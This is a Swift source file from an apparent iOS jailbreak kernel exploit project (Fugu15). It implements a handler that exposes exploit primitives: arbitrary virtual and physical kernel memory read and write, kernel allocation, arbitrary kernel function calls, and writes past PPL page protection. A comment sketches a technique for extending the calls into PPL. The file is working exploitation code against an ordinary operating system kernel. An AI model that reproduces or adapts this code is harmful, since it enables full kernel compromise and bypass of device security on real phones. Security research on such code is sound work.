//
//  iDownloadKRW.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload

public class iDownloadKRW: KRWHandler {
    func doRequest(id: UInt64, addr: UInt64, size: UInt64, buf: Data?) throws -> (status: UInt64, result: UInt64, data: Data?) {
        let res = Fugu15.oobPCIRequest(id: id, addrPid: addr, size: size, buf: buf)
        
        if Int64(bitPattern: res.status) < 0 {
            if let d = res.data {
                if let s = String(data: d, encoding: .utf8) {
                    throw KRWError.customError(description: s)
                }
            }
            
            throw KRWError.customError(description: "Unknown: \(res.status)")
        }
        
        return res
    }
    
    public func getSupportedActions() -> KRWOptions {
        return [.virtRW, .physRW, .kalloc, .kcall, .PPLBypass]
    }
    
    public func getInfo() throws -> (kernelBase: UInt64, slide: UInt64) {
        return (kernelBase: Fugu15.kernelBase, slide: Fugu15.kernelSlide)
    }
    
    public func resolveAddress(forName: String) throws -> KRWAddress? {
        return nil
    }
    
    public func kread(address: KRWAddress, size: UInt) throws -> Data {
        if address.options.contains(.physical) {
            let res = try doRequest(id: 1, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        } else {
            let res = try doRequest(id: 0, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        }
    }
    
    public func kwrite(address: KRWAddress, data: Data) throws {
        var id: UInt64 = address.options.contains(.physical) ? 3 : 2
        if address.options.contains(.PPL) {
            id += 2
        }
        
        _ = try doRequest(id: id, addr: address.address, size: UInt64(data.count), buf: data)
    }
    
    public func kalloc(size: UInt) throws -> UInt64 {
        guard let kallocAddr = Fugu15.patchfinder?.kalloc_data_external else {
            throw KRWError.customError(description: "Failed to find kalloc_data_external!")
        }
        
        for _ in 0..<1024 {
            let res = try kcall(func: KRWAddress(address: kallocAddr + Fugu15.kernelSlide, options: []), a1: UInt64(size), a2: 1, a3: 0, a4: 0, a5: 0, a6: 0, a7: 0, a8: 0)
            if res != 0 {
                return res
            }
        }
        
        throw KRWError.customError(description: "kalloc_data_external failed to allocate!")
    }
    
    public func kfree(address: UInt64) throws {
        throw KRWError.notSupported
    }
    
    public func kcall(func: KRWAddress, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        guard !`func`.options.contains(.physical) else {
            // Nope, can't do that without disabling MMU (hardware prevents that)
            throw KRWError.customError(description: "Physical kcall not supported!")
        }
        
        guard !`func`.options.contains(.PPL) else {
            // Support could be added by e.g. making the PPL stack kernel writeable
            // and then triggering an exception in PPL, making sure a fault handler
            // is set that jumps to e.g. x22
            // The kernel will then update the PPL register state on the stack and return to PPL
            // which will then jump to x22
            throw KRWError.customError(description: "PPL kcall not supported!")
        }
        
        var data = Data(fromObject: a1)
        data.appendGeneric(value: a2)
        data.appendGeneric(value: a3)
        data.appendGeneric(value: a4)
        data.appendGeneric(value: a5)
        data.appendGeneric(value: a6)
        data.appendGeneric(value: a7)
        data.appendGeneric(value: a8)
        
        let res = try doRequest(id: 6, addr: `func`.address, size: UInt64(data.count), buf: data)
        
        return res.result
    }
}
